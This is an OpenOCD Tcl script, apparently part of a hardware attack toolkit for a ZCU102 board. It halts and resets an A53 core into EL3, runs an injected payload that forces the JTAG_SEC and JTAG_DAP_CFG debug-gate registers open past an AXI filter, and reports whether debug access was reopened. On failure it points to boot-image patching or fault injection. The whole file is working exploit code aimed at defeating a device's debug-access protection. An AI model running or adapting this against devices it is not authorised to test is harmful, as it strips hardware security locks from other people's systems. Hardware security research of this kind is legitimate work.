# reopen-via-code.tcl — Tier-1 "code-exec on a core" debug-gate reopen.
#
# When the DAP-side write (reopen-debug.tcl) is filtered or blocked by the
# master-aware AXI filter — but a core can still be run at EL3-secure — the gate
# registers may yet be writable from the CPU side. This wrapper drives
# payloads/reopen-gates.bin through inject.tcl COLD mode: halt + reset A53 core 0
# into EL3, run the payload (read-modify-write JTAG_SEC|=0x1FF, JTAG_DAP_CFG|=0xFF),
# then report the payload's recorded before/after plus an independent DAP read-back
# of the live gates as ground truth.
#
# COLD mode FREEZES the OS (BOOTED_STATE reset cycle) — power-cycle to recover it.
# This is the intended "commandeer a core to open debug" action on a target.
#
# Run: openocd -f openocd/zcu102.cfg -c "init; source openocd/reopen-via-code.tcl; shutdown"

set _d [file dirname [info script]]

# Stage inject.tcl's parameters for the reopen-gates payload, then source it.
set ::INJECT_BIN         [file join $_d .. payloads reopen-gates.bin]
set ::INJECT_ADDR        0xFFFC0100
set ::INJECT_MODE        cold
set ::INJECT_DONE_ADDR   0xFFFE7000
set ::INJECT_DONE_VAL    0xCAFEC0DE
set ::INJECT_RESULT_ADDR 0xFFFE0000
set ::INJECT_RESULT_LEN  4
source [file join $_d inject.tcl]

# ---- verdict: the payload's recorded before/after + a live DAP read-back ----
proc _rb {a} { if {[catch {read_memory $a 32 1} v]} { return "ERR" } ; return [lindex $v 0] }
proc _hx {v} { if {$v eq "ERR"} { return "ERR" } ; return [format 0x%08X [expr {$v & 0xFFFFFFFF}]] }

catch { targets uscale.axi } _
set sec_before [_rb 0xFFFE0000]
set sec_after  [_rb 0xFFFE0004]
set dap_before [_rb 0xFFFE0008]
set dap_after  [_rb 0xFFFE000C]
set sec_live   [_rb 0xFFCA0038]
set dap_live   [_rb 0xFFCA003C]

puts ""
puts "================================================================"
puts " REOPEN-VIA-CODE  (EL3 CPU-side write of the debug gates)"
puts "================================================================"
puts [format " JTAG_SEC      payload before=%s after=%s   live(DAP)=%s" [_hx $sec_before] [_hx $sec_after] [_hx $sec_live]]
puts [format " JTAG_DAP_CFG  payload before=%s after=%s   live(DAP)=%s" [_hx $dap_before] [_hx $dap_after] [_hx $dap_live]]
puts ""

set sec_open 0
if {$sec_live ne "ERR" && ($sec_live & 0x7) == 0x7} { set sec_open 1 }
set dap_open 0
if {$dap_live ne "ERR" && ($dap_live & 0xFF) == 0xFF} { set dap_open 1 }

if {$sec_open && $dap_open} {
    puts " VERDICT: REOPENED — the EL3 CPU-side write stuck. DAP_SEC + APU/RPU debug"
    puts "   read OPEN. The gating was software register state reachable from the core."
} elseif {$sec_open || $dap_open} {
    puts " VERDICT: PARTIAL — one gate opened from the CPU side, the other did not"
    puts "   (eFuse-locked field, or the CPU-side write is also filtered for it)."
} else {
    puts " VERDICT: NOT REOPENED — the CPU-side write did not stick either. The gates"
    puts "   are eFuse-locked (immutable by software). Escalate to a Tier-2 boot-image"
    puts "   patch or Tier-4 fault injection (docs/15)."
}
puts " NOTE: COLD mode froze the OS (reset cycle) — power-cycle to restore it."
puts "================================================================"
puts ""
